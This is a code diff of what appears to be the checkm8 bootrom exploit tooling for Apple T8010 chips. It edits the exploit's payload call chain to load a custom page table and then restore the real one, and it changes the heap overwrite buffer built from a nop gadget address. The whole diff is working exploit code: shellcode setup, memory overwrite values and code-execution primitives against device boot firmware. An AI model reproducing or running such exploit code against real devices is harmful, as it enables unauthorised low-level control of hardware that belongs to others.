@@ -318,10 +318,12 @@ def payload(cpid):
       (t8010_write_ttbr0, 0x1800B0000),
       (t8010_tlbi, 0),
       (0x1820B0610, 0),
-      (t8010_write_ttbr0, 0x1800A0000),
+      (t8010_write_ttbr0, 0x1800A8000), # A custom pagetable we just set up
       (t8010_tlbi, 0),
       (t8010_exit_critical_section, 0),
       (0x1800B0000, 0),
+      (t8010_write_ttbr0, 0x1800A0000), # Real pagetable
+      (t8010_tlbi, 0),
     ]
     t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8010)[4:]
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
@@ -435,7 +437,7 @@ def all_exploit_configs():
   s5l895xx_overwrite = struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = struct.pack('<20xI4x', 0x48818000)
   s5l8960x_overwrite = struct.pack('<32xQ8x', 0x180380000)
-  t8010_overwrite    = struct.pack('<32x2Q16x32x2QI',    t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800, 0xbeefbeef)
+  t8010_overwrite    = struct.pack('<32x2Q', t8010_nop_gadget, 0x1800B0800)
   t8011_overwrite    = struct.pack('<32x2Q', t8011_nop_gadget, 0x1800B0800)
   t8015_overwrite    = struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
   
